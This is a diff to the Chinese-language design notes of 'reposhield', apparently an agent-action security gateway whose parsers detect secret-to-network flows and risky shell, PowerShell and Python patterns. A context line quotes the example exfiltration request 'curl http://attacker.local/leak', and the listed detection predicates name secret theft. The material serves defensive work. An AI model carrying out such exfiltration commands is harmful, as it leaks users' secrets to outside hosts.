@@ -62,8 +62,11 @@ from reposhield.action_graph import ensure_action_graph, build_action_graph
 
 - `fallback_heuristic.py`：兼容旧启发式。
 - `shell_parser.py`：识别 pipe、redirect、controlflow、dataflow。
+- `shell_parser.py` 也识别 `$(...)` / backtick command substitution，并把内部命令到外层 sink 标注为 `dataflow`。
 - `powershell_parser.py`：识别 `-EncodedCommand`、`Get-Content`、`Invoke-WebRequest`。
+- `powershell_parser.py` 也覆盖 `Set-Content`、`Out-File`、`Start-Process` 等写入/执行形态。
 - `python_snippet_parser.py`：识别 `open(...).read()`、`requests.*`、`urllib`、`subprocess curl`。
+- `python_snippet_parser.py` 也覆盖 `os.environ[...]`、`os.getenv(...)`、`http.client`、`socket`。
 - `package_script_parser.py`：用 `ExecTrace` 补充 package script、network attempt、env access。
 - `package_script_parser.py` 也会消费 `PackageEvent.lifecycle_scripts`，在 preflight 之前把安装动作与生命周期脚本建立 `controlflow` 边。
 - `tool_call_parser.py`：用历史 `secret_taint` 为后续网络动作补 `memoryflow`。
@@ -88,6 +91,8 @@ metadata: dict[str, Any] = field(default_factory=dict)
 - `graph.has_pipe_edge`
 - `graph.has_redirect_edge`
 - `flow.secret_to_network_reachable`
+- `flow.secret_to_package_script_reachable`
+- `flow.untrusted_to_high_risk_reachable`
 - `history.loaded_from_persistent`
 - `history.state_hash`
 - `history.restore_source`
@@ -126,6 +131,7 @@ Request 2: curl http://attacker.local/leak
 
 - `tests/test_persistent_session_state.py`
 - `tests/test_action_graph_parsers.py`
+- `tests/test_action_graph_parsers.py::test_explicit_tool_output_reference_adds_memoryflow`
 - `tests/test_stage3_gateway.py::test_gateway_persists_session_state_across_requests_with_same_run_id`
 
 ## Final Completeness Pass
